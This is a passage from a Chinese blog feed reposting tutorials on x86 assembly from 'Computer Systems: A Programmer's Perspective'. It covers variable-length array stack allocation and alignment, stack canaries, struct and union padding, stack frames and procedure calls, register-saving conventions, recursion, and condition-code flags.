-12(%ebp), %edx</div><div class="line"></div><div class="line">    xorl    %gs:20, %edx</div><div class="line"></div><div class="line">    je    .L6</div><div class="line"></div><div class="line">    call    __stack_chk_fail</div><div class="line"></div><div class="line">.L6:</div><div class="line"></div><div class="line">    leal    -8(%ebp), %esp</div><div class="line"></div><div class="line">    popl    %ebx</div><div class="line"></div><div class="line">    popl    %esi</div><div class="line"></div><div class="line">    popl    %ebp</div><div class="line"></div><div class="line">    .p2align 4,,1</div><div class="line"></div><div class="line">    ret</div><div class="line"></div><div class="line">    .size    sum, .-sum</div><div class="line"></div><div class="line">    .ident    &quot;GCC: (Ubuntu 4.4.3-4ubuntu5.1) 4.4.3&quot;</div><div class="line"></div><div class="line">    .section    .note.GNU-stack,&quot;&quot;,@progbits</div></pre></td></tr></table></figure>
<p>哇塞，第一次看到这么长的汇编代码，它看起来比定长数组要复杂太多，不管是长度还是其中的指令。不禁思考编译器这一次怎么这么笨了？猜测，动态数组的复杂性可能也是动态数组出现较晚的原因，更何况动态数组还有<code>缓冲区溢出</code>的危险。</p>
<p>现在我们一点点分析汇编代码，一探究竟。首先我们分析第一部分，包括了栈帧的建立、被调用者保存寄存器的备份以及栈内存的分配。它包括了以下几个开头的指令。</p>
<pre><code>pushl    %ebp

movl    %esp, %ebp

pushl    %esi

pushl    %ebx

subl    $16, %esp
</code></pre><p>用一幅图来说明这个问题，我们来分别看看，在指令执行前后，寄存器以及存储器的状态。</p>
<p><img src="/images/汇编-31.png" alt="动态数组"></p>
<p>接下来，我们看看比较复杂的一段代码，这一段代码的主要目的，是为动态数组分配内存。它们是如下的这些指令。</p>
<pre><code>movl    8(%ebp), %ebx

movl    %gs:20, %edx

movl    %edx, -12(%ebp)

xorl    %edx, %edx

leal    30(,%ebx,4), %edx

andl    $-16, %edx

subl    %edx, %esp

leal    15(%esp), %esi

andl    $-16, %esi
</code></pre><p>这一段代码相对于上一段就复杂了一点，还是先上一个指令执行前后的图，如下。</p>
<p><img src="/images/汇编-32.png" alt="动态数组"></p>
<p>我们仔细对比一下左右两张图可以发现，这里面最主要的两个值，就存在%edx和%esi寄存器当中。其中%edx的值是为数组分配的内存字节数，而%esi当中存储的则是数组的起始地址。我们不难想到，对于一个int类型长度为n的数组，它占用的内存字节数肯定是4n。而这里特别的地方就是，为什么不直接分配4n个字节然后把栈顶作为数组起始位置，而是分配了<code>(30+4n)&amp;(-16)</code>的字节，之后又把<code>(%esp+15)&amp;(-16)</code>的位置作为数组的起始位置？<code>为了效率</code>。</p>
<p>为了提高内存的读取速度，一般都会将<code>字节对齐</code>，而针对栈内存的分配，则大部分会保持为16字节的倍数。比如，如果处理器总是一次性从存储器中读取16个字节，则地址必须为16的倍数才行，也就是说地址的后4位必须为0。这样的话我们就好理解了，因为栈帧操作是从栈顶开始，直到帧指针或者备份着被调用者寄存器的内存位置为止（也就是上图中局域变量区域的范围），因此我们需要保证分配的字节数是16的倍数。</p>
<p>如此一来，分配<code>(30+4n)&amp;(-16)</code>个字节，就可以保证上图中-24的位置到<code>%esp</code>依然是16的倍数。<strong>因为对于任意一个正整数i来讲，都有i - 15 =&lt; i&amp;(-16) &lt;= i，并且i&amp;(-16)是16的倍数。因此对于(30+4n)&amp;(-16)来说，就有 <code>4n + 15 =&lt; (30+4n)&amp;(-16) &lt;= 4n + 30</code> 的结果</strong></p>
<p>这就保证了新分配的栈内存大小既是16的倍数，又能装下n个整数，因为它大于4n。不过这里很明显至少多了15个字节，这15个字节会被数组的起始地址消除掉。从图中可以看出，数组的起始地址并不是从栈顶开始的（从<code>%esi</code>指向的位置开始），这是因为数组的起始地址等于<code>(%esp+15)&amp;(-16)</code>，而不是<code>%esp</code>。这样做的目的也是为了对齐，只不过这里是地址对齐，将数组的起始地址对齐到16倍数的位置。由上面的结论我们知道 <code>%esp =&lt; (%esp+15)&amp;(-16) &lt;= %esp + 15</code>。</p>
<p>这样就保证了数组的起始地址不会逃出栈顶，这也是%esp要加上15的原因。由于数组的起始地址可能上移15位，因此原本预留的空间将可能再次缩小15个字节（位于<code>%esi</code>和<code>%esp</code>之间的那一小段）。因此我们就能得出实际可用的空间stack有如下范围 <code>4n &lt;= stack &lt;= 4n + 15</code> 。</p>
<p>这下我们就明白了，为什么4n要加上30，而不是加上15。是因为两次与-16的“与”运算，可能让空间浪费30个字节。所以加上30之后，就可以保证在满足栈内局部变量长度和数组起始位置都为16的倍数的前提下，还能至少留出4n的空间供数组使用。</p>
<p>还有一点需要一提的是，上图当中还出现了一个“金丝雀值”，这个家伙是为了<code>防止栈缓冲区溢出</code>。这当中的值是存储器当中的一个随机值，倘若这个值在函数返回时改变了，那么就代表缓冲区溢出了，就会终止程序的运行。</p>
<p>到此动态数组占用的内存区域就分配好了，接下来的就相对来说比较简单了，基本上与定长数组是一样的。下面是接下来所有的汇编代码，直接加入了详细的注释，相信大家都能看懂。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">testl    %ebx, %ebx//测试n是否大于0</div><div class="line"></div><div class="line">    jle    .L2//如果n小于等于0，就跳过两个循环，跳到L2</div><div class="line"></div><div class="line">    movl    $0, %ecx//%ecx与定长数组中的%eax作用一样，先初始化为0，后面逐渐+3赋给数组元素</div><div class="line"></div><div class="line">    movl    $0, %edx//%edx就是i，这里是i=0</div><div class="line"></div><div class="line">.L3:</div><div class="line"></div><div class="line">    movl    %ecx, (%esi,%edx,4)//对于i=0的时候来说，这里则相当于a[0]=0，因为%esi是数组起始地址。对于i来说，这里则代表a[i]=%ecx，a[i]的地址为a+4*i。</div><div class="line"></div><div class="line">    addl    $1, %edx//i自增</div><div class="line"></div><div class="line">    addl    $3, %ecx//将%eax加3，对于i=0的时候来说，%ecx就是a[1]的值。对于i来说，%ecx就是a[i+1]的值。</div><div class="line"></div><div class="line">    cmpl    %ebx, %edx//比较n和i</div><div class="line"></div><div class="line">    jne    .L3//如果i和n不相等则继续循环。</div><div class="line"></div><div class="line">    movl    $0, %edx//再次将i清0，即i=0</div><div class="line"></div><div class="line">.L4:</div><div class="line"></div><div class="line">    addl    (%esi,%edx,4), %eax//%eax就相当于sum，这里其实就是sum = sum + a[i]，其中a[i]的地址为a+4*i。</div><div class="line"></div><div class="line">    addl    $1, %edx//i自增</div><div class="line"></div><div class="line">    cmpl    %ebx, %edx//比较n和i</div><div class="line"></div><div class="line">    jne    .L4//如果n和i不相等则继续循环</div><div class="line"></div><div class="line">.L2:</div><div class="line"></div><div class="line">    movl    -12(%ebp), %edx//取出金丝雀值</div><div class="line"></div><div class="line">    xorl    %gs:20, %edx//比较金丝雀值是否改变</div><div class="line"></div><div class="line">    je    .L6//如果金丝雀值与原来的值相等，则代表缓冲区没溢出，跳到L6继续执行。</div><div class="line"></div><div class="line">    call    __stack_chk_fail//如果不相等，则代表缓冲区溢出，产生一个栈检查错误。</div><div class="line"></div><div class="line">.L6:</div><div class="line"></div><div class="line">    leal    -8(%ebp), %esp//让栈顶指向备份的%ebx，回收内存。</div><div class="line"></div><div class="line">    popl    %ebx//还原备份的%ebx值</div><div class="line"></div><div class="line">    popl    %esi//还原备份的%esi值</div><div class="line"></div><div class="line">    popl    %ebp//恢复原来的帧指针</div><div class="line"></div><div class="line">    .p2align 4,,1//对齐地址为16的倍数</div><div class="line"></div><div class="line">    ret//函数返回</div></pre></td></tr></table></figure>
<p>上面的这些指令相对来讲就比前面的简单了许多，相信各位看注释就能理解的八九不离十了，唯一特别一点的指令就是最后一个<code>p2align指令</code>。第一次见过这个指令，不过从名字上也能大概猜出来是干嘛的，不过为了准确，还是google到了这个指令的简单说明。它会将地址对齐为16（也就是第一个参数4，表示2的4次方的意思）的倍数，并最多跳过1个字节（也就是最后的参数1）。如果对齐需要跳过多于1个字节，则会忽略这个指令。</p>
<h3 id="异质结构与数据对齐"><a href="#异质结构与数据对齐" class="headerlink" title="异质结构与数据对齐"></a>异质结构与数据对齐</h3><p>异质结构是指不同数据类型的数组组合，比如C语言当中的结构（struct）与联合（union）。在理解数组的基础上，这两种数据结构都非常好理解。我们先来看一个结构的例子，比如下面的这个结构。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">#include &lt;stdio.h&gt;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">struct &#123;</div><div class="line"></div><div class="line">    int a;</div><div class="line"></div><div class="line">    int b;</div><div class="line"></div><div class="line">    char c;</div><div class="line"></div><div class="line">&#125; mystruct;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">int main()&#123;</div><div class="line"></div><div class="line">    printf(&quot;%d\n&quot;,sizeof mystruct);</div><div class="line"></div><div class="line">    </div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这是一个非常简单的结构体，这个程序在32位windows系统上，输出结果是12，或许有的猿友还可以得到10或者16这样的结果。或许有的猿友会奇怪，为什么不是4+4+1=9呢。</p>
<p>这正是因为上面我们提到过的<code>对齐</code>的原因，只不过这里的对齐不是地址对齐也不是栈分配空间对齐，而是<code>数据对齐</code>。为了提高数据读取的速度，一般情况下会将数据以2的指数倍对齐，具体是2、4、8还是16，得根据具体的硬件设施以及操作系统来决定。</p>
<p>这样做的好处是，处理器可以统一的一次性读取4（也可能是其它数值）个字节，而不再需要针对特殊的数据类型读取做特殊处理。在这个例子来说，也就是说在读取a、b、c时，都可以统一的读取4个字节。特殊的，这里0-3的位置用于存储a，4-7的位置用于存储b，8的位置用于存储c，而9-11则用于填充，其中都是空的。</p>
<p>与结构体不同的是，联合会复用内存空间，以节省内存，比如我们看下面这个例子。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">#include &lt;stdio.h&gt;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">union &#123;</div><div class="line"></div><div class="line">    int a;</div><div class="line"></div><div class="line">    int b;</div><div class="line"></div><div class="line">    char c;</div><div class="line"></div><div class="line">&#125; myunion;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">int main()&#123;</div><div class="line"></div><div class="line">    printf(&quot;%d\n&quot;,sizeof myunion);</div><div class="line"></div><div class="line">    </div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这段程序输出的结果是4，依旧是32位windows操作系统的结果。这是因为a、b、c会共用4个字节，这样做的目的不言而喻，是为了节省内存空间，显然它比结构体节省了8个字节的空间。它与结构体最大的区别就在于，对a、b、c赋值时，联合会覆盖掉之前的赋值，而结构体则不会，结构体可以同时保存a、b、c的值。</p>
<p>文章内容来源：<a href="http://www.cnblogs.com/zuoxiaolong/p/computer20.html" target="_blank" rel="external">深入理解计算机系统（3.8）—数组、异质结构以及指针的详解（十分重要）（难度较高）【呕心沥血版】</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;现在我们一起去探讨C语言中数组、结构体的实现，相比之下，数组与流程控制和过程的实现难度差不多，尤其是动态数组可能相对来说困难一点。&lt;/p&gt;
&lt;h3 id=&quot;数组简介&quot;&gt;&lt;a href=&quot;#数组简介&quot; class=&quot;headerlink&quot; title=&quot;数组简介&quot;&gt;&lt;/a&gt;数
    
    </summary>
    
      <category term="深入理解计算机系统" scheme="http://yoursite.com/categories/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="深入理解计算机系统" scheme="http://yoursite.com/tags/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>深入理解计算机系统|汇编的世界-5</title>
    <link href="http://yoursite.com/2018/05/08/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E6%B1%87%E7%BC%96%E7%9A%84%E4%B8%96%E7%95%8C-5/"/>
    <id>http://yoursite.com/2018/05/08/深入理解计算机系统-汇编的世界-5/</id>
    <published>2018-05-08T11:30:10.000Z</published>
    <updated>2018-05-08T05:03:05.691Z</updated>
    
    <content type="html"><![CDATA[<p>这一节我们探讨过程调用[函数调用]是如何完成的。</p>
<h3 id="栈帧的结构"><a href="#栈帧的结构" class="headerlink" title="栈帧的结构"></a>栈帧的结构</h3><p>倘若我们要想搞清楚过程的实现，就必须先知道栈帧的结构是如何构成的。栈帧其实可以认为是程序栈的一段，而程序栈又是存储器的一段，因此栈帧说到底还是存储器的一段。那么既然是一段，肯定有两个端点。</p>
<p>这两个端点其实就是两个地址，<strong>一个标识着起始地址，一个标识着结束地址，而这两个地址，则分别存储在固定的寄存器当中，即起始地址存在%ebp寄存器当中，结束地址存在%esp寄存器当中</strong>。至于为什么要存在这两个寄存器当中，就像程序的下一条指令地址为什么存在PC当中一样，是毫无意义的问题，就是这样规定的，没有为什么。</p>
<p>起始地址和结束地址还有另外的名字，起始地址通常称为帧指针，结束地址通常称为栈指针（也就是栈顶的地址）。因此，我们就把过程的存储器内存使用区域称为栈帧。这下我们就了解了栈帧的来历以及它们的命名习惯和存储惯例，接下来的一幅图，它揭示了栈帧在存储器当中的位置。</p>
<p><img src="/images/汇编-25.png" alt="栈帧"></p>
<p>这个图基本上已经包括了程序栈的构成，它由一系列栈帧构成，这些栈帧每一个都对应一个过程，而且每一个帧指针+4的位置都存储着函数的返回地址，每一个帧指针指向的存储器位置当中都备份着调用者的帧指针。各位需要知道的是，每一个栈帧都建立在调用者的下方（也就是地址递减的方向），当被调用者执行完毕时，这一段栈帧会被释放。还有一点很重要的是，%ebp和%esp的值指示着栈帧的两端，而栈指针会在运行时移动，所以大部分时候，在访问存储器的时候会基于帧指针访问，因为在一直移动的栈指针无法根据偏移量准确的定位一个存储器位置。</p>
<p>　　还有一点比较重要的内容，就是栈帧当中内存的分配和释放。由于栈帧是向地址递减的方向延伸，因此如果我们将栈指针减去一定的值，就相当于给栈帧分配了一定空间的内存。这个理解起来很简单，因为在栈指针向下移动以后（也就是变小了），帧指针和栈指针中间的区域会变长，这就是给栈帧分配了更多的内存。相反，如果将栈指针加上一定的值，也就是向上移动，那么就相当于压缩了栈帧的长度，也就是说内存被释放了。<strong>需要注意的是，上面的一切内容，都基于一个前提，那就是帧指针在过程调用当中是不会移动的。</strong></p>
<h3 id="过程的实现"><a href="#过程的实现" class="headerlink" title="过程的实现"></a>过程的实现</h3><p>过程虽然很好，但想要实现过程，还是存在一定难度的，尽管现在看来它并不困难。<strong>它实现的难度主要就在于数据如何在调用者和被调用者之间传递，以及在被调用者当中局部变量内存的分配以及释放。</strong></p>
<p>不过天大的难题都难不倒那群计算机界的大神们，他们找出了一种方式，可以简单并有效的处理过程实现当中的难题。这一切似乎看起来十分偶然，但其实也是必然的。世间的很多规律都是客观存在的，只是它在等着我们去发现而已。</p>
<p>总的来说，过程实现当中，<code>参数传递</code>以及<code>局部变量内存的分配和释放</code>都是通过以上介绍的栈帧来实现的，大部分情况下，我们认为过程调用当中做了以下几个操作。</p>
<p>1、备份原来的帧指针，调整当前的帧指针到栈指针的位置，这个过程就是我们经常看到的如下两句汇编代码做的事情。</p>
<pre><code>pushl    %ebp
movl    %esp, %ebp
</code></pre><p>2、建立起来的栈帧就是为被调用者准备的，当被调用者使用栈帧时，需要给临时变量分配预留内存，这一步一般是经过下面这样的汇编代码处理的。</p>
<pre><code>subl    $16,%esp
</code></pre><p>3、备份被调用者保存的寄存器当中的值，如果有值的话，备份的方式就是压入栈顶。因此会采用如下的汇编代码处理。</p>
<pre><code>pushl    %ebx
</code></pre><p>4、使用建立好的栈帧，比如读取和写入，一般使用mov，push以及pop指令等等。</p>
<p>5、恢复被调用者寄存器当中的值，这一过程其实是从栈帧中将备份的值再恢复到寄存器，不过此时这些值可能已经不在栈顶了。因此在恢复时，大多数会使用pop指令，但也并非一定如此。</p>
<p>6、释放被调用者的栈帧，释放就意味着将栈指针加大，而具体的做法一般是直接将栈指针指向帧指针，因此会采用类似下面的汇编代码处理（也可能是addl）。</p>
<pre><code>movl    %ebp,%esp
</code></pre><p>7、<strong>恢复调用者的栈帧，恢复其实就是调整栈帧两端，使得当前栈帧的区域又回到了原始的位置</strong>。因为栈指针已经在第六步调整好了，因此此时只需要将备份的原帧指针弹出到%ebp即可。类似的汇编代码如下。</p>
<pre><code>popl    %ebp
</code></pre><p>8、弹出返回地址，跳出当前过程，继续执行调用者的代码。<strong>此时会将栈顶的返回地址弹出到PC，然后程序将按照弹出的返回地址继续执行。这个过程一般使用<code>ret指令</code>完成。</strong></p>
<p>过程的实现大概就是以上八个步骤组成的，不过这些步骤并不都是必须的（大部分时候，开启编译器的优化会优化掉很多步骤），而且第6和第7步有时会使用leave指令代替。</p>
<h3 id="过程相关指令：call、leave、ret"><a href="#过程相关指令：call、leave、ret" class="headerlink" title="过程相关指令：call、leave、ret"></a>过程相关指令：call、leave、ret</h3><p>由于过程调用当中会经常见到几个新的指令，因此在这里，先给大家介绍一下这三个指令。它们三个都是过程实现当中非常重要的角色，这三个指令很类似，因为它们都是<strong>一个指令做了两件事</strong>，这里就依次介绍一下它们各自都做了什么事。</p>
<ul>
<li><p>call指令：它一共做两件事，第一件是将返回地址（也就是call指令执行时PC的值）压入栈顶，第二件是将程序跳转到当前调用的方法的起始地址。第一件事是为了为过程的返回做准备，而第二件事则是真正的指令跳转。</p>
</li>
<li><p>leave指令：它也是一共做两件事，第一件是将栈指针指向帧指针，第二件是弹出备份的原帧指针到%ebp。第一件事是为了释放当前栈帧，第二件事是为了恢复调用者的栈帧。</p>
</li>
<li><p>ret指令：它同样也是做两件事，第一件是将栈顶的返回地址弹出到PC，第二件事则是按照PC此时指示的指令地址继续执行程序。这两件事其实也可以认为是一件事，因为第二件事是系统自己保证的，系统总是按照PC的指令地址执行程序。</p>
</li>
</ul>
<p>可以看出，除了call指令之外，leave和ret指令都与上面8个步骤有些不可分割的关系。call指令没有在8个步骤当中体现，是因为它发生在进入过程之前，因此在第1步发生的时候，call指令往往已经被执行了，并且已经为ret指令准备好了返回地址。</p>
<h3 id="寄存器使用的规矩"><a href="#寄存器使用的规矩" class="headerlink" title="寄存器使用的规矩"></a>寄存器使用的规矩</h3><p>寄存器一共就8个，因此在数目上来说的话，使用起来肯定是捉襟见肘的。在这种情况下，就肯定需要一定的规矩去约束程序如何使用，否则要是一群人翻同一个人的牌子，那到底伺候谁才是呢。其实我们在之前已经或多或少的接触到了寄存器的规矩，比如%eax一般用于存储过程的返回值，%ebp保存帧指针，%esp保存栈指针。这里要介绍的，是另外一个规矩，而这个规矩是与过程实现相关的。</p>
<p>试想一下，在调用一个过程时，无论是调用者还是被调用者，都可能更新寄存器的值。假设调用者在%edx中存了一个整数值100，而被调用者也使用这个寄存器，并更新成了1000，于是悲剧就发生了。当过程调用完毕返回后，调用者再使用%edx的时候，值已经从100变成了1000，这几乎必将导致程序会错误的执行下去。</p>
<p>为了避免上面这种情况发生，就需要在调用者和被调用者之间做一个协调。于是便有了这样的规矩，它的描述如下，我们假设这里在过程P中调用了过程Q，P是调用者，Q是被调用者。</p>
<ul>
<li><p><code>%eax、%edx、%ecx</code>：这三个寄存器被称为调用者保存寄存器。意思就是说，这三个寄存器由调用者P来保存，而对于Q来说，Q可以随便使用，用完了就不用再管了。</p>
</li>
<li><p><code>%ebx、%esi、%edi</code>：这三个寄存器被称为被调用者保存寄存器。同样的，这里是指这三个寄存器由被调用者Q来保存，换句话说，Q可以使用这三个寄存器，但是如果里面有P的变量值，Q必须保证使用完以后将这三个寄存器恢复到原来的值，这里的备份，其实就是上面那8个步骤中第3个步骤做的事情。</p>
</li>
</ul>
<h3 id="一个过程示例"><a href="#一个过程示例" class="headerlink" title="一个过程示例"></a>一个过程示例</h3><p>进过上面纸上谈兵的阶段，接下来我们就要探索真理了，我们随便写一个如下的过程调用的例子，我们称它为function.c。</p>
<pre><code>int add(int a,int b){
   register int c = a + b; 
   return c;
}

int main(){
   int a = 100;
   int b = 101;
   int c = add(a,b);
   return c;
}
</code></pre><p>这里为了完整的展现那8个步骤，因此给变量c加了register关键字修饰，这将会将c送入寄存器，从而更改被调用者保存寄存器，就会导致步骤3的发生。接下来我们就使用参数-S来编译这段代码，然后使用cat来看看这段代码的汇编形式。以下是main函数以及add函数各自的栈帧情况，贴心的我已经详细标记了它们属于哪个步骤。</p>
<p><img src="/images/汇编-26.png" alt="过程调用"></p>
<p><img src="/images/汇编-27.png" alt="过程调用"></p>
<p>由于我们没有使用编译优化，因此汇编代码会多出很多，这也为了完整的诠释我们的步骤。可以看到，图中包含了完整的8个步骤，但是无论是main函数还是add函数，它们单独来讲，都没有完整的8个步骤，这其实是大多数的情况。大部分时候，一个函数不会完全包含上述的8个步骤。</p>
<p>这里有几点各位需要注意的地方，首先第一点是，add函数会将返回结果存入%eax（前提是返回值可以使用整数来表示），在main函数中，call指令之后，默认将%eax作为返回结果来使用。第二点是，所有函数（包括main函数）都必须有第1步和第6、7、8步，这是必须的4步。最后一点是，我们的栈指针和帧指针有固定的大小关系，即栈指针永远小于等于帧指针，当二者相等时，当前栈帧被认为没有分配内存空间。</p>
<h3 id="递归过程调用"><a href="#递归过程调用" class="headerlink" title="递归过程调用"></a>递归过程调用</h3><p>接下来我们看一个特殊的过程调用–递归是怎么实现的。</p>
<p>看一个递归求和的例子：</p>
<pre><code>int rfact(int n){
    int result;
    if(n&lt;=1){
        result = 1;
    }else{
        result = n * rfact(n-1);
    }
    return result;
}
</code></pre><p>接下来我们编译一下这段代码，使用-O1优化，我们可以得到如下的汇编代码。</p>
<p><img src="/images/汇编-29.png" alt="汇编代码"></p>
<p>如果理解了过程调用的机制，不难读懂这个递归调用的例子，但是难点就在于，栈帧的变化是如何的，贴心的我就给各位演示一下栈帧的变化过程，如果各位已经把前面的那个main函数和add函数搞定了，那么可以在这里验证一下自己的理解是否正确。</p>
<p><img src="/images/汇编-28.png" alt="递归调用"></p>
<p>需要特殊说明的是，以上每一个栈帧（大括号括起来的），最上面（也就是地址递增方向）的都是帧指针位置，最下面的都是栈指针位置。然而寄存器中只有%ebp和%esp保存栈帧指针，因此同一时间只能保存一对。当进展到第三层的时候，已经有了三个栈帧（原则上来讲一定是多于3个），寄存器当然是存不下的，因此就需要在存储器当中备份一下，之后再恢复。于是就出现了每个栈帧的帧指针指向的存储器位置，都会备份着外层方法（也就是调用者）的帧指针。</p>
<p>当方法递归到n=1结束时，栈帧会自下向上依次收回，栈帧指针（也就是%ebp和%esp当中的值）都会依次向上移动，直到程序结束。也就是说，上面的三幅图，如果倒过来，就是递归方法依次结束时栈帧的状态。</p>
<p>由此就可以看出，过程当中栈帧建立以及完成的惯例，可以保证递归调用的正常运行，包括循环调用。不得不说，这群计算机界的大神们实在是太牛了，尽管当栈帧出现以后，看起来也并不复杂，但难点就在于<code>无中生有的发现或者说某种意义上的创造</code>。</p>
<p>文章内容来自：<a href="http://www.cnblogs.com/zuoxiaolong/p/computer19.html" target="_blank" rel="external">深入理解计算机系统（3.7）—汇编世界当中过程的经典（十分重要）（难度较高）</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这一节我们探讨过程调用[函数调用]是如何完成的。&lt;/p&gt;
&lt;h3 id=&quot;栈帧的结构&quot;&gt;&lt;a href=&quot;#栈帧的结构&quot; class=&quot;headerlink&quot; title=&quot;栈帧的结构&quot;&gt;&lt;/a&gt;栈帧的结构&lt;/h3&gt;&lt;p&gt;倘若我们要想搞清楚过程的实现，就必须先知道栈帧的结构
    
    </summary>
    
      <category term="深入理解计算机系统" scheme="http://yoursite.com/categories/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="深入理解计算机系统" scheme="http://yoursite.com/tags/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>深入理解计算机系统|汇编的世界-4</title>
    <link href="http://yoursite.com/2018/05/08/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E6%B1%87%E7%BC%96%E7%9A%84%E4%B8%96%E7%95%8C-4/"/>
    <id>http://yoursite.com/2018/05/08/深入理解计算机系统-汇编的世界-4/</id>
    <published>2018-05-07T17:28:03.000Z</published>
    <updated>2018-05-07T16:13:07.257Z</updated>
    
    <content type="html"><![CDATA[<h3 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h3><p>本章我们来看一个特别有趣的内容，就是汇编级别的语言，如何利用寄存器实现if/for/while这些高级语言的流程控制，我相信你能感受到它的神奇之处。</p>
<h3 id="条件码寄存器"><a href="#条件码寄存器" class="headerlink" title="条件码寄存器"></a>条件码寄存器</h3><p>在汇编层面，if/for/while的流程控制，都是通过跳转来实现的，那是怎么判断是否跳转的呢？ <code>条件寄存器</code></p>
<table>
<thead>
<tr>
<th>寄存器</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>CF (Carry Flag)</td>
<td>进位标志寄存器，它记录无符号操作的溢出，当溢出时会被设为1</td>
</tr>
<tr>
<td>ZF (Zero Flag)</td>
<td>零标志寄存器，当计算结果为0时将会被设为1</td>
</tr>
<tr>
<td>SF (Sign Flag)</td>
<td>符号标志寄存器，当计算结果为负数时会被设为1</td>
</tr>
<tr>
<td>OF (Overflow Flag)</td>
<td>溢出标志寄存器，当计算结果导致了补码溢出时，会被设为1</td>
</tr>
</tbody>
</table>
<p>从上面寄存器的简单说明可以看出，ZF和SF可以判断结果的符号，而CF和OF可以判断无符号和补码的溢出。而我们平时使用的高级程序语言，就仅仅靠这四个寄存器和跳转指令，就可以演化出千变万化的流程控制，再一次感叹汇编设计者的伟大。</p>
<h3 id="改变条件码寄存器的值"><a href="#改变条件码寄存器的值" class="headerlink" title="改变条件码寄存器的值"></a>改变条件码寄存器的值</h3><p>通常情况下，条件码寄存器的值无法主动被改变，它们大多时候是被动改变，这算是条件码寄存器的特色。这其实理解起来并不困难，因为条件码寄存器是1位的，而我们的数据格式最低为b，也就是8位，因此你无法使用任何数据传送指令去传送一个单个位的值。</p>
<p>几乎所有的算术与逻辑指令都会改变条件码寄存器的值，不过改变的前提是触发了条件码寄存器的条件。比如对于<code>subl %edx,%eax</code>这个减法指令，假设<code>%edx</code>和<code>%eax</code>寄存器的值都为<code>0x10</code>，则两者相减的结果为0，此时ZF寄存器将会被自动设为1。对于其它的指令运算，都是类似的，会根据结果的不同而设置不同的条件码寄存器。</p>
<h3 id="特殊的测试指令"><a href="#特殊的测试指令" class="headerlink" title="特殊的测试指令"></a>特殊的测试指令</h3><p>在进行算术与逻辑操作时，条件码寄存器的值可能随之改变。这里介绍两个比较特别的测试指令，它们不改变普通寄存器或者存储器的值，只是为了设置条件码寄存器的值。这算是唯二两个可以主动设置条件码寄存器的指令，它们分别是cmp以及test指令。</p>
<p>cmp是compare的意思，它有两个操作数，比如cmp S2，S1，最终会基于S1-S2的值去设置条件码寄存器的值。而对于test来说是类似的，对于test S2，S1来说，它将基于S1&amp;S2去设置条件码寄存器的值。另外需要一提的是，两者都需要加数据格式后缀，比如b、w、l这些后缀。</p>
